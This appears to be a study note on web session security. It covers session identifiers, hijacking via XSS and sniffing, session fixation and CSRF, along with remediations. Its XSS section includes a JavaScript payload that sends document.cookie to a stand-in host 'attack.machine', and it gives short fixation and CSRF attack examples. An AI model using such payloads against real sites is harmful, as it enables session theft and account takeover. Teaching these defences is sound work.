
# Session Security

## Weaknesses of the session identifier

Most web applications offer a login page and need to keep track of user sessions. The main reason is to stop users logging in everytime they use the web app.

HTTP is a stateless protocol, cookies where added to the browser to allow for stateful communication and session management.

## Session identifier

The session identifier is the unique key that identifies a user session within a database of sessions.

It is critical that the session management mechanism stops users impersonating each other. Strong session identifiers are ID's thar are:

* valid for a single session only
* time limited
* purely random (thus unpredictable)

Never store session tokens in...

* URL's
* HTML
* HTML5 Web Storage
  - localStorage
  - sessionStorage

## Session Hijacking

Session Hijacking refers to the exploitation of a valid session assigned to a user. An attacker gains a victims session identifier using mitm or xss.

## Session Hijack attacks

Session HiJack attacks can occur when:

* exploiting existing XSS
* Gaining direct access to the sessions on the server
* packet sniffing
* finding session IDs in logs or browser history

## Session hijack via XSS

This is possible when:

* xss vulnerabilities exist which you can execute your own payload
* the session id is sent through cookies in each HTTP request
* cookies are readable by javascript

```js
var i = new Image();
i.src = "http://attack.machine/steal.php?q="%2bdocument.cookie;
```

The *HTTPONLY* flag disabled cookie access from javascript. This will prevent this attack from working.

```
ini_set('session.cookie_httponly', '1');
```

## Session hijack via packet sniffing

* victim HTTP traffic can be sniffed
* HTTP traffic must be unencrypted

## Session Fixation

Session fixation is session hijacking technique whereby an attacker forces a victim to use a certain sessionID.

* attacker obtains a valid sessionID
* attacker forces victim to use this sessionID when establishing a connection to the server.

* the session identifier remains the same after login or other operation
* the session identifier can be propagated

eg.

```
http://sessionfixation.site/login.php?SESSION=ABC
```

## Remediation

Always generate a new session ID after login... and do not allow the user to set their own session ID.

http://php.net/manual/en/function.session-regenerate-id.php

.NET example

```
Session.Abandon();
Response.Cookies.Add(new HTTPCookie("ASP.NET_SessionId", ""))
```

http://web.archive.org/web/20130328004438/http:/support.microsoft.com/kb/899918

## Cross Site Request Forgery (CSRF)

CSRF or XSRF attacks (pronounced Sea-Surf attacks) are hard to discover using automated tools.

A CSRF is a vulnerability where a third party web app is able to perform an action on the users behalf.

## Example

* bob visits shop.com logs in and leaves without logging out
* bob then visits malicious.com which makes a request to shop.com (to buy a book)
* it works because shop.com thinks its a legitimate request from bob.

```
<html>
<img src="http://shop.com/buy/123" />
</html>
```

* http://thehackernews.com/2014/08/flickr-cross-site-request-forgery.html
* http://web.archive.org/web/20150418174949/http:/breakingbits.net/2015/01/18/taking-over-godaddy-accounts-using-csrf/
* http://www.ehackingnews.com/2012/10/hacker-news-csrf-vulnerability-in-Twitter.html

Using cookies for session management allows CSRF to work... if you use URLs that enables other exploits.

## Remediations

* Tokens (CSRF tokens)
* Captchas

A CSRF token is a nonce that must be used with the page request. If an attacker omits the nonce from the request the server can disregard it. The attacker should not be able to guess the token so it must be sufficiently random.

* generate a token.
* include token as a hidden input on the form
* save the token in the session variables

## References

* https://www.owasp.org/index.php/HttpOnly
* http://php.net/manual/en/function.session-regenerate-id.php
* http://web.archive.org/web/20130328004438/http:/support.microsoft.com/kb/899918
* http://joomlacode.org/gf/project/joomla/frs/?action=FrsReleaseBrowse&frs_package_id=1
* http://tomcat.apache.org/tomcat-6.0-doc/config/manager.html
* http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html
* http://joomlacode.org/gf/project/joomla/scmsvn/?action=browse&path=/development/releases/1.0/
* http://shiflett.org/blog/2007/jul/csrf-redirector
